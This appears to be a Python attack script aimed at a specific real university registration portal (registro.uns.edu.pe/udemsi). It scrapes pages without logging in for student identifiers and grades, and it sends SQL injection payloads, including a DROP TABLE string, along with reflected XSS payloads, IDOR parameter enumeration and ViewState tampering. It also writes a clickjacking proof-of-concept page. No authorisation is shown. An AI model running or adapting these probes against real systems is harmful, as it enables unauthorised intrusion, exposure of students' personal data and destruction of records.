#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACION PROFUNDA - SIIGAA/udemsi
"""
import requests
import urllib3
import re
urllib3.disable_warnings()

registro = "https://registro.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
    'Referer': f"{registro}/udemsi/",
})

print("=" * 70)
print("  EXPLOTACION SIIGAA - registro.uns.edu.pe/udemsi/")
print("=" * 70)

# ============================================
# 1. Leer modulos.xhtml - SIN LOGIN
# ============================================
print("\n[1] Leyendo /udemsi/faces/modulos.xhtml (SIN LOGIN)")
print("-" * 50)

r = s.get(f"{registro}/udemsi/faces/modulos.xhtml", timeout=10)
print(f"  HTTP {r.status_code}, len={len(r.text)}")

# Save for analysis
with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\modulos_xhtml.html", "w") as f:
    f.write(r.text)

# Look for any data in the response
# Check for student data, grades, etc.
data_patterns = [
    r'(?:estudiante|alumno|estudiantes)\s*\|\s*[\w\s]+',
    r'(?:nota|calificacion|grade)\s*[:=]\s*[\d]+',
    r'(?:matricula|matriculas|matriculado)',
    r'(?:codigo|codigo_estudiante|cod_alumno)',
    r'(?:dni|documento|documento_de_identidad)',
]

for pattern in data_patterns:
    matches = re.findall(pattern, r.text, re.IGNORECASE)
    if matches:
        print(f"  [+] {pattern}: {matches[:5]}")

# Look for any tables or data
# JSF pages often have h:dataTable or p:dataTable
data_tables = re.findall(r'<h:dataTable[^>]*>', r.text)
if data_tables:
    print(f"  [+] DataTables encontrados: {len(data_tables)}")

p_tables = re.findall(r'<p:dataTable[^>]*>', r.text)
if p_tables:
    print(f"  [+] PrimeFaces DataTables: {len(p_tables)}")

# Look for any visible data
# Check for any text that looks like student data
# Look for any IDs, codes, names
ids = re.findall(r'(?:\d{6,}|\b\d{8,}\b)', r.text)
if ids:
    print(f"  [+] Posibles IDs/Numeros: {ids[:10]}")

# Look for any column headers (JSF tables)
headers = re.findall(r'<h:column[^>]*>(.*?)</h:column>', r.text, re.DOTALL)
if headers:
    print(f"  [+] Columnas: {headers[:5]}")

# Look for any form actions
forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', r.text)
print(f"  Forms actions: {forms}")

# Look for any commandButtons
buttons = re.findall(r'<h:commandButton[^>]*action=["\']([^"\']+)["\']', r.text)
if buttons:
    print(f"  [+] CommandButtons: {buttons[:10]}")

# Look for any links
links = re.findall(r'<h:outputLink[^>]*value=["\']([^"\']+)["\']', r.text)
if links:
    print(f"  Links: {links[:10]}")

# Look for any messages
messages = re.findall(r'<h:messages[^>]*>(.*?)</h:messages>', r.text, re.DOTALL)
if messages:
    print(f"  Messages: {messages}")

# Look for any data that looks like academic info
academic_keywords = ['semestre', 'curso', 'materia', 'nota', 'promedio', 'credito', 'horas']
for kw in academic_keywords:
    if kw in r.text.lower():
        # Find the context around the keyword
        matches = [m.start() for m in re.finditer(kw, r.text.lower())]
        for m in matches[:3]:
            start = max(0, m - 50)
            end = min(len(r.text), m + 100)
            context = r.text[start:end].strip()
            print(f"  [+] '{kw}' encontrado: {context[:100]}")

# ============================================
# 2. Leer index.xhtml
# ============================================
print("\n\n[2] Leyendo /udemsi/faces/index.xhtml")
print("-" * 50)

r2 = s.get(f"{registro}/udemsi/faces/index.xhtml", timeout=10)
print(f"  HTTP {r2.status_code}, len={len(r2.text)}")

# Look for content
if 'modulos' in r2.text.lower() or 'menu' in r2.text.lower():
    print(f"  [+] Contiene menu de modulos")
if 'bienvenida' in r2.text.lower() or 'welcome' in r2.text.lower():
    print(f"  [+] Pagina de bienvenida")
if 'estudiante' in r2.text.lower() or 'alumno' in r2.text.lower():
    print(f"  [+] Contiene info de estudiante")

# ============================================
# 3. Probar CSRF (sin tokens)
# ============================================
print("\n\n[3] Verificando CSRF")
print("-" * 50)

# Since there are NO CSRF tokens, any form submission can be forged
# Find the forms and their actions
forms = re.findall(r'<form[^>]*name=["\']([^"\']+)["\'][^>]*>', r.text)
if forms:
    print(f"  Forms sin CSRF: {forms}")
    for form_name in forms:
        # Try to submit the form with fake data
        # Find the form parameters
        form_pattern = rf'<form[^>]*name="{form_name}"[^>]*>'
        form_match = re.search(form_pattern, r.text)
        if form_match:
            # Look for inputs in the form
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', r.text)
            print(f"  Form {form_name} inputs: {inputs[:10]}")

# Look for any action that can be forged
# JSF forms typically submit to the same page
# Look for h:commandButton actions
actions = re.findall(r'<h:commandButton[^>]*action=["\']([^"\']+)["\']', r2.text)
print(f"  Actions en index.xhtml: {actions}")

# ============================================
# 4. Probar ViewState manipulation
# ============================================
print("\n\n[4] Probando manipulación de ViewState")
print("-" * 50)

# The javax.faces.ViewState is a hidden field
# In JSF, the ViewState is used to maintain state
# If we can manipulate it, we might be able to:
# 1. Access other users' data
# 2. Perform actions as another user
# 3. Bypass some security checks

view_state = re.search(r'name=["\']javax\.faces\.ViewState["\'][^>]*value=["\']([^"\']+)["\']', r.text)
if view_state:
    VS_VALUE = view_state.group(1)
    print(f"  ViewState actual: {VS_VALUE[:50]}...")
    
    # Try to submit the form with a manipulated ViewState
    # This could potentially allow us to access other data
    
    # Try to POST to the same page with different parameters
    # JSF applications process POST requests with the ViewState
    post_tests = [
        {
            "javax.faces.ViewState": VS_VALUE,
            "javax.faces.source": "",
            "javax.faces.partial.event": "click",
        },
    ]
    
    for post_data in post_tests:
        try:
            r = s.post(f"{registro}/udemsi/faces/index.xhtml", 
                      data=post_data, timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                # Check if the response changed
                if 'modulos' in r.text.lower() or 'datos' in r.text.lower():
                    print(f"  [+] POST exitoso - respuesta cambió")
        except:
            pass

# ============================================
# 5. Probar IDOR (Insecure Direct Object Reference)
# ============================================
print("\n\n[5] Probando IDOR")
print("-" * 50)

# JSF applications often use numeric IDs for resources
# Try to access other students' data by changing IDs
idor_urls = [
    f"{registro}/udemsi/faces/modulos.xhtml?id=1",
    f"{registro}/udemsi/faces/modulos.xhtml?id=2",
    f"{registro}/udemsi/faces/modulos.xhtml?codigo=1",
    f"{registro}/udemsi/faces/modulos.xhtml?codigo=2",
    f"{registro}/udemsi/faces/modulos.xhtml?dni=12345678",
    f"{registro}/udemsi/faces/modulos.xhtml?matricula=2024001",
    f"{registro}/udemsi/faces/modulos.xhtml?estudiante=1",
    f"{registro}/udemsi/faces/modulos.xhtml?alumno=1",
]

for url in idor_urls:
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            # Check if the response changed based on the parameter
            # Look for any data that changed
            if 'estudiante' in r.text.lower() or 'alumno' in r.text.lower():
                print(f"  [+] Posible IDOR: {url}")
    except:
        pass

# ============================================
# 6. Probar SQL Injection en parámetros
# ============================================
print("\n\n[6] Probando SQL Injection")
print("-" * 50)

sqli_params = [
    f"{registro}/udemsi/faces/modulos.xhtml?codigo=' OR '1'='1",
    f"{registro}/udemsi/faces/modulos.xhtml?codigo=1' OR 1=1--",
    f"{registro}/udemsi/faces/modulos.xhtml?dni=1' OR '1'='1",
    f"{registro}/udemsi/faces/modulos.xhtml?id=1; DROP TABLE users--",
    f"{registro}/udemsi/faces/modulos.xhtml?id=1' UNION SELECT NULL,NULL--",
    f"{registro}/udemsi/faces/index.xhtml?nombre=' OR '1'='1",
]

for url in sqli_params:
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200:
            # Check for SQL error messages
            if 'error' in r.text.lower() and ('sql' in r.text.lower() or 'mysql' in r.text.lower() or 'syntax' in r.text.lower()):
                print(f"  [!] SQL ERROR: {url}")
            elif 'exception' in r.text.lower() and 'jboss' in r.text.lower():
                print(f"  [!] JBoss exception: {url}")
            elif 'ora-' in r.text.lower() or 'oracle' in r.text.lower():
                print(f"  [!] Oracle error: {url}")
            elif len(r.text) < 200 and 'error' in r.text.lower():
                print(f"  [!] Posible error: {url}")
                print(f"    Response: {r.text[:200]}")
    except:
        pass

# ============================================
# 7. Probar XSS
# ============================================
print("\n\n[7] Probando XSS")
print("-" * 50)

xss_params = [
    f"{registro}/udemsi/faces/modulos.xhtml?nombre=<script>alert(1)</script>",
    f"{registro}/udemsi/faces/modulos.xhtml?nombre=\"><script>alert(1)</script>",
    f"{registro}/udemsi/faces/modulos.xhtml?nombre='><img src=x onerror=alert(1)>",
    f"{registro}/udemsi/faces/modulos.xhtml?nombre=<svg/onload=alert(1)>",
]

for url in xss_params:
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200:
            # Check if the script is reflected without encoding
            if '<script>alert(1)</script>' in r.text:
                print(f"  [!] XSS CONFIRMADO: {url}")
                print(f"  [!] Script reflejado sin codificacion!")
            elif 'onerror=alert(1)' in r.text or 'onload=alert(1)' in r.text:
                print(f"  [!] XSS CONFIRMADO (event handler): {url}")
            elif '&lt;script&gt;' in r.text or '<script>' not in r.text:
                print(f"  [+] Input codificado (no vulnerable)")
    except:
        pass

# ============================================
# 8. Probar Clickjacking
# ============================================
print("\n\n[8] Probando Clickjacking")
print("-" * 50)

# Since there's no X-Frame-Options, we can embed the page
# Create a clickjacking proof-of-concept
clickjack_html = """<!DOCTYPE html>
<html>
<body>
<h1>Clickjacking PoC</h1>
<iframe src="https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml" 
        style="opacity:0.5; position:absolute; top:0; left:0; width:100%; height:100%;"
        name="targetframe" allowtransparency="true">
</iframe>
</body>
</html>"""

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\clickjack_poc.html", "w") as f:
    f.write(clickjack_html)
print(f"  [+] PoC de Clickjacking guardado: clickjack_poc.html")
print(f"  [!] La pagina se puede embeder en iframes sin restricciones")

# ============================================
# 9. Verificar si hay mas paginas accesibles
# ============================================
print("\n\n[9] Escaneando mas paginas sin login")
print("-" * 50)

more_pages = [
    "/udemsi/faces/modulos.xhtml",
    "/udemsi/faces/principal.xhtml",
    "/udemsi/faces/consulta.xhtml",
    "/udemsi/faces/consultar.xhtml",
    "/udemsi/faces/ver.xhtml",
    "/udemsi/faces/resultado.xhtml",
    "/udemsi/faces/reporte.xhtml",
    "/udemsi/faces/datos.xhtml",
    "/udemsi/faces/academico.xhtml",
    "/udemsi/faces/estudiante.xhtml",
    "/udemsi/faces/notas.xhtml",
    "/udemsi/faces/matricula.xhtml",
    "/udemsi/faces/horario.xhtml",
]

for page in more_pages:
    try:
        r = s.get(f"{registro}{page}", timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            has_data = '<table' in r.text.lower() or '<td' in r.text.lower() or 'data' in r.text.lower()
            print(f"  [+] {page} -> HTTP {r.status_code} (data={has_data})")
    except:
        pass

# ============================================
# 10. Leer el contenido de modulos.xhtml
# ============================================
print("\n\n[10] Analisis del contenido de modulos.xhtml")
print("-" * 50)

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\modulos_xhtml.html", "r") as f:
    content = f.read()

# Look for any text that looks like actual data
# Search for patterns that look like student records
# Check for any table rows
tr_matches = re.findall(r'<tr[^>]*>(.*?)</tr>', content, re.DOTALL)
print(f"  Tabla rows encontradas: {len(tr_matches)}")

# Look for any text content
# Remove HTML tags and look for actual text
text_content = re.sub(r'<[^>]+>', ' ', content)
text_content = re.sub(r'\s+', ' ', text_content)
# Look for any meaningful text
meaningful_patterns = [
    r'\b\d{4}-\d{2}-\d{2}\b',  # Dates
    r'\b\d{6,}\b',  # Numbers (IDs, codes)
    r'\b[A-Z][a-z]+ [A-Z][a-z]+\b',  # Names
]

for pattern in meaningful_patterns:
    matches = re.findall(pattern, text_content)
    if matches:
        print(f"  [+] Pattern {pattern}: {matches[:10]}")

# Look for any PrimeFaces components
pf_components = re.findall(r'<p:\w+[^>]*>', content)
print(f"  PrimeFaces components: {pf_components[:10]}")

# Look for any messages/errors
msg_patterns = re.findall(r'<h:message[^>]*>(.*?)</h:message>', content, re.DOTALL)
if msg_patterns:
    print(f"  Messages: {msg_patterns}")

# Look for any form data that might be pre-filled
pre_filled = re.findall(r'value=["\']([^"\']+)["\']', content)
if pre_filled:
    print(f"  Pre-filled values: {pre_filled[:20]}")

print("\n\n--- FIN ---")
